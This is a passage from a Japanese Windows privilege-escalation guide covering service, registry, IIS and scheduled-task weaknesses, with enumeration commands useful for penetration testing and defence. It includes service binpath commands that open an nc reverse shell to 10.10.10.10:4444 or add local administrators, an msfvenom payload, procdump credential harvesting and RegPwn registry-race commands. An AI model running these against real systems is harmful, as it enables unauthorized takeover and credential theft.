まず、プロセスを一覧表示し、プロセスのコマンドラインにパスワードが含まれていないか確認します。\
実行中のバイナリを**上書きできるか**、またはバイナリのフォルダーへの書き込み権限があるかを確認し、[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用できる可能性を調べます。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

常に実行中の [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) がないか確認してください。権限昇格に悪用できる可能性があります。

debugger listener は短時間しか起動しないことがあるため、受動的なポートスナップショットで見つからなくても、過去に公開されていなかったとは限りません。検出した listener について、PID、プロセスの所有者、権限の低いユーザーからアクセス可能かどうかを照合してください。アプリケーション名や debug flag だけでは、ユーザーをまたいだコード実行が可能だとは判断できません。通常の列挙は受動的に行い、debugger コマンドは送信しないでください。

**プロセスのバイナリの権限を確認する**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリが格納されているフォルダーのアクセス権を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor ディレクトリ

Snort 2 は、`snort.exe -c <config>` で選択した設定ファイル内で宣言された `dynamicpreprocessor directory` から共有ライブラリを読み込めます。別のアカウントで Snort を実行するスケジュールされたタスクやサービスについて調査する場合は、実際に使用される設定ファイルと、宣言されたモジュールディレクトリの ACL を確認してください。自分のトークンでその場所にファイルを作成できる場合、そのタスクまたはサービスが次にモジュールを読み込むときにコード実行につながる可能性があるため、調査対象になります。実行アカウントの有効な権限、アクティブな設定、モジュールの互換性、拒否設定や共有の制限を確認してください。ディレクトリに書き込み可能というだけでは、権限昇格が成立するとは限りません。[Snort の dynamic-preprocessor ドキュメント](https://www.snort.org/documents/dpx-readme)では、実行時のモジュール読み込みについて説明されています。

### 書き込み可能なドキュメントルートを持つ特権 Web サービス

Windows の Apache インストールでは、サービスの実行ファイルパスと実行アカウントを、アクティブな `httpd.conf` 内の `DocumentRoot` と照合してください。一般的な XAMPP の構成では、`C:\xampp\apache\conf\httpd.conf` と、そこに設定されているドキュメントルート（多くの場合 `C:\xampp\htdocs`）の ACL を確認します。Apache が `LocalSystem` として実行されている間に、低権限ユーザーがそのルートにファイルを作成できる場合、サーバー側コード実行によってホストの権限境界を越えられる可能性があります。サービスが実行中であること、実際のパスが公開されていること、そのファイル形式がサーバー側ハンドラーによって処理されることを確認してください。ルートへの書き込みが可能というだけで証明できるのは、ファイルを作成できることだけです。プローブを書き込まずに ACL を確認してください:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

一般的な WAMP のインストールでは、サービスがバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit 構成では `C:\wamp\...`）を指し、その隣の `conf\httpd.conf` に設定があり、既定のルートが `C:\wamp64\www` または `C:\wamp\www` になっている場合があります。サービスの正確なイメージパス、実行アカウント、実効 `DocumentRoot`（`${INSTALL_DIR}` の展開や virtual-host の上書きを含む）、ルートの ACL を合わせて確認してください。WAMP ディレクトリが書き込み可能だからといって、Apache が `SYSTEM` として実行される、または提出したファイルを実行するとは限りません。[Apache のドキュメントでは、Windows サービスが設定を選択する方法が説明されています](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 書き込み可能な IIS ルートと application-pool のネットワーク ID

IIS では、`applicationHost.config` 内で書き込み可能な物理ディレクトリが**有効なサイト／アプリケーション**に割り当てられていることを確認し、設定された pool とサーバー側の handler を特定します。IIS がそのファイル形式を処理し、ルートに到達可能な場合に限り、配信対象ディレクトリに置いたコードは pool の ID で実行されます。書き込み可能なディレクトリをコード実行と見なす前に、現在のユーザーが実効的にファイルを作成できるか、サイトの実行状態、handler、パスごとの上書き設定を確認してください。

ASP.NET の動的コンパイルについては、アプリケーションのコンパイルディレクトリに生成されるファイルも別途確認が必要です。既定では、該当する .NET Framework インストール配下の `Temporary ASP.NET Files` ディレクトリですが、アプリケーションの `<compilation tempDirectory>` で変更できます。[Microsoft は保存場所とアプリケーションごとのサブディレクトリについて説明しており](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29)、[application pool 同士が互いを信頼しない場合にコンパイルディレクトリを分離することを推奨しています](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低権限の token が**特定の**アプリケーションの cache 内にある生成ソースを変更できる場合、そのアプリケーションが、より高い権限を持つ [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) で再コンパイルするかを確認してください。ファイルやディレクトリの ACL だけではコード実行の証明になりません。cache と有効なアプリケーション、実効 token と ACL、コンパイル設定、プロセス ID、再コンパイルのタイミングを照合してください。読み取り専用のメタデータ確認にとどめ、列挙中にコンパイルを誘発したり、cache ファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` に設定された IIS pool は、ローカルの token が低権限であっても、通常はドメインリソースに対して**ホストコンピューターのアカウント**で認証します。`LocalSystem` はローカルですでに高い権限を持ち、ネットワーク上でもコンピューターアカウントを使用します。`LocalService` は通常、匿名のネットワーク資格情報を使用します。`SpecificUser` pool は、設定されたアカウントを使用します。[Microsoft はこれらの ID タイプ](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel)と[application-pool のネットワーク ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)について説明しています。ID 設定が省略されている場合は pool の既定値を継承することがあり、その既定値は IIS の世代によって異なるため、pool 名から推測せず実効設定を確認してください。コード実行がコンピューターアカウントのネットワーク ID を持つ pool に到達する場合は、**そのコンピューター固有の**ディレクトリ権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md) にはドメインの naming context に対するレプリケーション権限が必要です。マシンアカウントの ticket やホストの役割だけでは、その権限の証明になりません。受動的な列挙では、ファイルをアップロードしたり、ネットワーク認証を行ったり、ticket を要求したりせずに、設定と ACL を確認してください。

helper process を起動する ASP.NET handler が読み取り可能な場合、request 由来の値が認証、復号、検証、コマンド構築を経る過程を追跡してください。復号した token を `ProcessStartInfo("cmd", "/c ...")` に連結する handler では、shell のメタ文字によってコマンドを変更できる可能性があります。[Microsoft は `cmd` の特殊文字について説明しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼できない caller が実際に復号後の値に影響を与えられ、handler に到達できることを確認したうえで、実効 application-pool または impersonated identity と、子プロセスの ID を特定してください。ソースコードの一行、localhost の listener、または token 形式の弱点だけでは、特権コマンド実行の証明になりません。受動的な列挙中は、偽造した request を送信したり helper を実行したりせず、ソースと pool の設定を確認してください。

Windows 上の PHP サービスでは、request で制御できるパスが [`include` または `require`](https://www.php.net/manual/en/function.include.php) に渡されると、低権限ユーザーが書き込み可能な PHP ファイルが worker の ID で評価される可能性があります。request がその文に到達できること、解決されたパスが低権限ユーザーに変更可能で worker が読み取り可能なファイルを指すこと、適用される PHP のパス制限が include を許可すること、worker が実際により高い権限で実行されていることを確認してください。loopback listener や書き込み可能なファイルだけでは、この一連の条件が成立する証拠にはなりません。受動的な列挙中は endpoint を呼び出さず、ソース、サービス ID、ファイル ACL を確認してください。

### メモリからのパスワード採取

sysinternals の **procdump** を使うと、実行中のプロセスの memory dump を作成できます。FTP などの service は**メモリ内に資格情報を平文で保持**していることがあるため、memory dump を取得して資格情報を読み取ってみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 安全でないGUIアプリ

**SYSTEMとして実行されているアプリケーションから、ユーザーがCMDを起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows ヘルプとサポート」（Windows + F1）で「コマンド プロンプト」を検索し、「クリックしてコマンド プロンプトを開く」をクリックします。

### 特権を持つプロジェクトファイルのインポート

低権限ユーザーが書き込み可能なドロップディレクトリからプロジェクトを自動的に開くアプリケーションは、インポーターのアカウント権限で入力の信頼境界を越えます。**実際に書き込み可能なパス**、そのパスを開くプロセスまたはタスク、実効ID、パーサーのビルドを確認してください。[過去のGhidraプロジェクトのオープン／復元に関する問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトメタデータ内のXML外部エンティティが許可されていました。Windows上でネットワークエンティティを使うと、[送信SMBおよびNTLMポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)が許可している場合、インポートを行うアカウントから認証が発生する可能性があります。これは認証情報漏えいにつながる手掛かりであり、即座に管理者アクセスが得られるわけではありません。応答を利用するには、別の認可済みまたは脆弱な経路が必要です。また、現行ビルドについては、実際のパッチ適用状況を確認してください。受動的な列挙中に細工されたプロジェクトを開かないでください。インポートのワークフローとACLを調査してください。

## Services

Service Control Manager (SCM) オブジェクトに対する[`SC_MANAGER_CREATE_SERVICE`権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存サービスに対する権限とは別です。この権限を指定した読み取り専用の[`OpenSCManager`アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功しても、それは調査の手掛かりにすぎず、新しいサービスを実行できる証明にはなりません。[`CreateService`はハンドルを返します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)。そのハンドルには作成時に要求したサービスアクセス権が付与されます。後からサービスを再オープンすると別途アクセスチェックが行われ、元のハンドルを使用できる場合でも失敗することがあります。実効ローカルまたはリモートトークン、ハンドルに付与された権限、サービスアカウント、起動ポリシー、実行ファイルのパスをそれぞれ確認してください。受動的な列挙中にサービスを作成または起動しないでください。

リモートからサービスをインストールする経路を調べる場合は、SCM権限と、対象上にある、**同じネットワークログオン**で書き込み可能な共有、その基盤となるNTFS ACL、およびサービスアカウントが実行できるローカル実行ファイルのパスを関連付けて確認してください。SCM権限が異例に広く、ファイル配置経路も存在する場合、非管理者アカウントでもこの境界を越えられる可能性があります。管理共有は必須条件ではありません。共有への書き込み権限だけでも、SCMのサービス作成権限という手掛かりだけでも、新しいサービスをより高い権限で起動できるとは判断できません。

既存のサービスは、`ImagePath`に記載された実行ファイルがなくても、起動時、シャットダウン時、または別のライフサイクルイベント時にヘルパー実行ファイルを呼び出すことがあります。ヘルパー名が低権限ユーザーの書き込み可能なディレクトリに解決され、サービスがより高い権限で実行される場合、欠落しているヘルパーファイルは条件付きで置き換えの候補となります。**実際のサービスコードまたは文書化されたヘルパー呼び出し**、解決される実行ファイルのパスと検索順序、ディレクトリの作成権限、サービスID、利用可能なライフサイクルトリガーを確認してください。サービスディレクトリが書き込み可能であることや、ファイルが欠落していることだけでは、サービスがそのファイルを読み込むとは判断できません。受動的な調査中にサービスを起動または停止しないでください。

既存サービスでは、[`SERVICE_START`を持つと`StartService`に引数を渡せます](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは[`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)とは別の権限です。開始権限を単なる制御権限以上のものと見なす前に、サービスのコードまたは文書化されたインターフェースを確認してください。呼び出し元が選択した引数をログまたはエクスポート先のパスとして使う場合は、サービスID、引数から書き込みまでの正確な処理経路、パス制限、**作成されるファイル**の権限を確認してください。保護されたディレクトリへの書き込みが権限昇格につながるのは、そのファイルを受け入れる別の特権コンシューマーまたはローダーがある場合に限られます。書き込み可能なログや開始権限だけでは不十分です。受動的なインベントリ調査中にサービスを起動したり、テストファイルを作成したりしないでください。

NSClient++監視エージェントでは、読み取り可能な`nsclient.ini`は**設定確認の手掛かり**です。Web認証情報が含まれている場合があり、`boot.ini`によって設定ファイルの場所が別の場所に変更されていることもあります。実際のサービスアカウント、WEBリスナーとアクセス制御ポリシー、認証済みロールに設定やスクリプトを変更する権限があるかを確認してください。特権実行にはさらに、`CheckExternalScripts`（または別の有効な実行経路）、コマンドの登録または変更を行う実効権限、そのコマンドをサービスIDで実行するトリガーが必要です。ループバック専用のリスナーでもローカルユーザーから到達できる場合がありますが、ファイルパス、パスワード、またはリスナーの存在だけでは、そうした権限があるとは判断できません。受動的な列挙中は、シークレットを表示したりWeb APIを呼び出したりせずに、メタデータと権限を確認してください。[NSClient++のファイル構成](https://nsclient.org/docs/concepts/file-layout/)、[Webとスクリプトのセキュリティガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath`が`nssm.exe`のサービスでは、サービスの実際の実行アカウントと、`HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`の値を調べてください。[NSSMは子アプリケーションをここに保存します](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)。`AppDirectory`は設定された作業ディレクトリです。ラッパーの権限だけをサービスの境界全体と見なす前に、子実行ファイルとその親ディレクトリのACLを確認してください。その子が公開するローカルWCFまたはSOAPエンドポイントは、別途調査すべき手掛かりです。低権限ユーザーからリスナーに到達できること、対象の操作がそのユーザーの入力を受け付けること、サービスの子プロセスがより高い権限で危険な操作を実行することを確認してください。サービスアカウント、エンドポイントURL、または書き込み可能なパスだけでは、権限昇格の証明にはなりません。受動的な列挙中にサービス操作を呼び出さないでください。

カスタムWCF操作では、呼び出し元が制御できる文字列がPowerShell runspaceに渡される経路を追跡してください。[`Pipeline.Commands.AddScript`はスクリプトテキストを追加します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)。[`Pipeline.Invoke`はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windowsトランスポート認証情報を使用する`netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、その**特定の**操作を呼び出す認可とrunspaceの実効IDは、別途確認する必要があります。低権限の呼び出し元の入力から、より高いサービスIDで実行される`AddScript`までの経路は、コード実行の境界です。リスニングポート、認証済みクライアント、または無関係なアセンブリ内の未使用メソッドだけでは証明になりません。列挙中にエンドポイントを呼び出さず、デプロイ済みサービス、コントラクト、認可、偽装設定を静的に確認してください。

Service Triggersを使うと、特定の条件（名前付きパイプ／RPCエンドポイントのアクティビティ、ETWイベント、IPの利用可能状態、デバイスの接続、GPOの更新など）が発生したときにWindowsがサービスを起動できます。SERVICE_START権限がなくても、トリガーを発生させることで特権サービスを起動できることがあります。列挙と有効化の手法はこちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio診断コレクターサービス

C/C++ツールを含むVisual Studioのインストール環境には、`LocalSystem`として実行されるよう設定された診断サービス`VSStandardCollectorService150`が含まれている場合があります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)では、junctionとオブジェクトマネージャーリンクを利用した競合状態により、サービスのDACLリセット先をリダイレクトしました。実証された権限昇格には、さらに、利用可能なVisual Studio Setup WMI ProviderのMSI修復経路と、その対象である`C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`が必要でした。このコンポーネントは2024年1月に修正されています。

受動的なトリアージでは、そのサービスのアカウントとバイナリパスを調べ、Setup WMIコンパイラのパスが存在するかを確認し、インストール済みコンポーネントのパッチ適用状況を検証してください。サービスエントリ、Visual Studio製品バージョン、またはコンパイラファイルだけでは、ホストが脆弱だとは判断できません。調査のためにサービスを起動したり、修復を実行したりする必要はありません。

サービスの一覧を取得します:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### 権限

**sc** を使ってサービスの情報を取得できます。

```bash
sc qc <service_name>
```

各サービスに必要な特権レベルを確認するには、_Sysinternals_ のバイナリ **accesschk** を用意することをおすすめします。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」が変更可能なサービスがあるか確認することを推奨します。

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP 用の accesschk.exe はこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

（たとえば SSDPSRV で）次のエラーが発生した場合:

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、有効なデバイスが関連付けられていないため、開始できません。_

次のコマンドで有効にできます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**（XP SP1では、upnphostサービスの動作にSSDPSRVが必要な点に注意してください）**

**この問題に対する別の回避策**は、次を実行することです：

```
sc.exe config usosvc start= auto
```

### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対して **SERVICE_ALL_ACCESS** を持つシナリオでは、サービスの実行可能バイナリを変更できます。サービスを変更して **sc** を実行するには:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスの再起動

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限は、さまざまなアクセス許可を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再構成を許可します。
- **WRITE_DAC**: アクセス許可の再構成を可能にし、サービス構成を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得とアクセス許可の再構成を許可します。
- **GENERIC_WRITE**: サービス構成を変更する権限を継承します。
- **GENERIC_ALL**: サービス構成を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの脆弱なアクセス許可

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権を持つドメインアカウントとして実行されていて、**低権限ユーザーがサービスの EXE またはその親フォルダーを変更できる**場合、**バイナリを置き換えてサービスを再起動する**ことで、サービスを乗っ取れることがよくあります。

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが配置されている**フォルダーへの書き込み権限があるか**を確認してください ([**DLL Hijacking**](dll-hijacking/index.html))**。**\
**wmic**（system32 内にはありません）を使って、サービスによって実行されるすべてのバイナリを取得し、**icacls** を使ってアクセス許可を確認できます：

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

また、**sc** と **icacls** も使用できます:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービスの実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実用的な悪用手順は次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能であることを確認します。
3. サービスのバイナリを payload または有効な悪意のあるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または、再起動やサービスのトリガーを待ちます）。

自動チェックに便利なツール：<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスが通常のユーザーによる再起動を許可していない場合は、起動時に自動で開始されるか、障害時に再起動するアクションが設定されているか、またはそのサービスを使用するアプリケーションから間接的に起動できるかを確認してください。

### サービスのレジストリ変更権限

サービスのレジストリを変更できるか確認してください。\
サービスの**レジストリ**に対する**権限**は、次の方法で**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

特定のサービスキーに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が書き込み可能なレジストリ権限を持っているか確認します。ACL エントリがあるだけでは、実効アクセスがあるとは限りません。拒否エントリ、現在のトークン、継承された権限も考慮する必要があります。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` および `SERVICE_START` 権限とは別です。権限昇格には、使用可能なサービス構成フィールド、サービスを起動する手段、より高い権限を持つサービス ID も必要です。Microsoft の[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)および[サービスのアクセス権に関するリファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行されるバイナリの Path を変更するには:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### レジストリ symlink race による任意の HKLM 値書き込み（ATConfig）

一部の Windows アクセシビリティ機能はユーザーごとの **ATConfig** キーを作成し、後で **SYSTEM** プロセスがその内容を HKLM のセッションキーにコピーします。レジストリの **symbolic link race** によって、この特権的な書き込みを **任意の HKLM パス**にリダイレクトでき、任意の HKLM **値を書き込む**手段を得られます。<sup>[[18]](#references)</sup>

主な場所（例：スクリーン キーボード `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みのアクセシビリティ機能が列挙されています。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` はログオン時やセキュア デスクトップへの切り替え時に作成され、ユーザーが書き込み可能です。

悪用の流れ（CVE-2026-24291 / ATConfig）:

1. SYSTEM に書き込ませたい値を **HKCU ATConfig** に設定します。
2. セキュア デスクトップへのコピーをトリガーします（例：**LockWorkstation**）。これにより AT broker の処理が開始されます。
3. **race に勝ちます**。`C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定し、oplock が発火したら **HKLM Session ATConfig** キーを、保護された HKLM の対象への **registry link** に置き換えます。
4. SYSTEM がリダイレクト先の HKLM パスに、攻撃者が指定した値を書き込みます。

任意の HKLM 値を書き込めるようになったら、サービス設定値を上書きして LPE に移行します:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/コマンドライン）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが開始できるサービス（例：**`msiserver`**）を選び、書き込み後に起動します。**注:** 公開されている exploit の実装では、race の一環としてワークステーションをロックします。

ツールの例（RegPwn BOF / standalone）:<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### サービスのレジストリに対するAppendData/AddSubdirectory権限

レジストリに対してこの権限がある場合、**そのレジストリの下にサブレジストリを作成できます**。Windowsサービスの場合、**任意のコードを実行するのに十分です。**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windowsはスペースより前で終わるすべてのパスを実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windowsは次を実行しようとします:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

組み込み Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて一覧表示します。

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**この脆弱性は** metasploit の `exploit/windows/local/trusted\_service\_path` **を使って検出および悪用できます**。metasploit を使ってサービスバイナリを手動で作成することもできます:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Recovery Actions

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指定するように設定できます。このバイナリを置き換え可能な場合、privilege escalation が可能なことがあります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## Scheduled task script targets

有効なタスクが `.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する場合は、`cmd.exe` だけでなく、**action arguments** に記載されたスクリプトも確認してください。PowerShell の `-File` など、インタープリターに明示的なファイル引数を指定する場合も同様です。スケジュールされたバッチファイルに PowerShell の `-File` 呼び出しがリテラルで含まれている場合は、参照先スクリプトの ACL も確認してください。変数、条件分岐、シェルの連結がある場合は、手動で追跡する必要があります。呼び出し元が書き込み可能なスクリプトまたは親ディレクトリは、設定されたタスクの principal が呼び出し元と異なり、かつタスクが実際にそのアクションに到達する場合に限り、アカウントをまたいだ実行につながる可能性があります。スクリプトでは追記のみ可能な ACL が問題になることもありますが、それより前の `exit` やその他の制御フローによって、追記した行が実行されない場合があります。privilege escalation と判断する前に、実効 ACL、[タスクの実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリ作成時にスクリプトを変更したり、タスクを開始したりしてはいけません。

## Named streams on accessible files

NTFS では、読み取り可能なファイルに名前付き `:$DATA` ストリームが含まれている場合があり、その内容は通常のディレクトリ一覧には表示されません。アクセス可能なバックアップまたは構成ファイルのうち、関連性の高い少数のファイルについて、内容を開く前にストリームの**名前とサイズ**を確認してください。Windows では [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) および PowerShell の [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) を使って確認できます。秘密情報を示唆するストリーム名は、あくまで手がかりです。ファイルへの実効読み取りアクセス、ファイルシステムでのストリームのサポート状況、ストリームに利用可能な認証情報が含まれているか、その認証情報が実際にどのアカウントとして認証されるかを確認してください。通常の列挙では、再帰的なストリーム検索やストリーム内容の表示を避けてください。

## Scheduled Windows Driver Kit helper inputs

オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、およびプロジェクトの `working\rsf.rsf` ファイルを読み込むことがあります。特権アカウントでこのヘルパーを起動するスケジュールタスクまたはサービスがある場合、ヘルパーの実行ファイル自体が保護されていても、これらの入力への低権限の書き込みアクセスが、そのアカウントのコンテキストでのコマンド実行につながる可能性があります。特権でこれらのファイルを読み込むプロセスが存在することと、サイドカーファイル**両方**を作成または変更できることを確認してください。ヘルパーを見つけただけでは不十分です。

